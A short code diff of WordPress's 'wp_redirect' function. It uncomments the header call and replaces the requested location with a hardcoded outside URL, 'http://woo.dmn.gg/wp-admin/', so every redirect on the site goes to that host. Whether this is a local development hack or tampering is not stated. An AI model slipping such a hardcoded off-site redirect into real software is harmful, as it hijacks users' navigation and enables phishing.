@@ -1438,9 +1438,9 @@ if ( ! function_exists( 'wp_redirect' ) ) :
 		// 	//header( "X-Redirect-By: $x_redirect_by" );
 		// }
 
-		// header( "Location: $location", $status );
+		 header( "Location: http://woo.dmn.gg/wp-admin/", $status );
 
-		// return true;
+		 return true;
 	}
 endif;
 
